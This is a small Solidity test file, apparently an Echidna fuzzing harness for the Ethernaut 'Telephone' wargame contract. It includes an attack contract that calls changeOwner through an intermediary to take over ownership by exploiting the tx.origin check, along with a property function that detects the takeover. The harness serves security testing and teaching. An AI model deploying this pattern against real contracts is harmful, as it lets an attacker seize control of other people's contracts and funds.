// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract AttackContract {
    constructor(address _sender) public {
        Test telephone = Test(0x4242);
        telephone.changeOwner(address(_sender));
    }
}

contract Test is Telephone {
    constructor() Telephone() public {
        new AttackContract(address(0x4343));
    }

    function echidna_is_owner() public view returns(bool) {
        if (owner == msg.sender) {
            return false;
        } else {
            return true;
        }
    }
}